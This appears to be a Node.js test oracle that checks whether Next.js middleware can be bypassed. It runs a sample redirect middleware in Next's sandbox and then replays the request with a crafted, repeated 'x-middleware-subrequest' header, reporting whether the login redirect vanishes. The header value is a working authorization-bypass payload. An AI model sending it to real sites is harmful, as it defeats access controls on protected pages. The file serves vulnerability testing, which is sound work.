const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function out() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

(async () => {
  try {
    let NextRequest;
    let NextResponse;
    let run;
    try {
      NextRequest = require('next/dist/server/web/spec-extension/request').NextRequest;
      NextResponse = require('next/dist/server/web/spec-extension/response').NextResponse;
      run = require('next/dist/server/web/sandbox/sandbox').run;
    } catch (e) {
      evidence = 'module_resolution_failed:' + (e && e.message ? e.message : String(e));
      out();
      return;
    }

    if (typeof NextRequest !== 'function' || typeof NextResponse !== 'function' || typeof run !== 'function') {
      evidence = 'missing_required_exports';
      out();
      return;
    }

    const base = path.join(os.tmpdir(), 'next-oracle-' + Date.now() + '-' + Math.random().toString(16).slice(2));
    const serverDir = path.join(base, 'server');
    const middlewarePath = path.join(serverDir, 'middleware.js');
    fs.mkdirSync(serverDir, { recursive: true });

    const middlewareSource = [
      "const { NextResponse } = require('next/server');",
      "module.exports = function middleware(req) {",
      "  if (req.nextUrl.pathname.startsWith('/protected')) {",
      "    return NextResponse.redirect(new URL('/login', req.url));",
      "  }",
      "  return NextResponse.next();",
      "};"
    ].join('\n');

    fs.writeFileSync(middlewarePath, middlewareSource);

    async function invoke(targetPath, subrequestHeader) {
      const headers = new Headers();
      if (subrequestHeader) headers.set('x-middleware-subrequest', subrequestHeader);
      const req = new NextRequest('https://example.test' + targetPath, { method: 'GET', headers });

      const result = await run({
        distDir: base,
        name: 'middleware',
        paths: ['/middleware'],
        edgeFunctionEntry: {
          name: 'middleware',
          page: '/middleware',
          files: [],
          wasm: [],
          assets: [],
          env: []
        },
        request: req,
        useCache: false,
        onWarning: function () {}
      });

      return result;
    }

    let benign;
    try {
      benign = await invoke('/protected/area');
    } catch (e) {
      evidence = 'benign_exception:' + (e && e.message ? e.message : String(e));
      out();
      return;
    }

    const benignResp = benign && benign.response;
    const benignLocation = benignResp && benignResp.headers && benignResp.headers.get ? benignResp.headers.get('location') : null;
    if (!benignLocation || benignLocation.indexOf('/login') === -1) {
      evidence = 'benign_failed:no_redirect';
      out();
      return;
    }

    operation_completed = true;

    try {
      const attackHeader = 'middleware:middleware:middleware:middleware:middleware';
      const attacked = await invoke('/protected/area', attackHeader);
      const attackResp = attacked && attacked.response;
      const attackLocation = attackResp && attackResp.headers && attackResp.headers.get ? attackResp.headers.get('location') : null;
      exploit_succeeded = !attackLocation;
      evidence = 'benign_redirect=1|attack_redirect=' + (attackLocation ? 1 : 0) + '|header=' + attackHeader;
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious_blocked_exception:' + (e && e.message ? e.message : String(e));
    }

    out();
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
    out();
  }
})();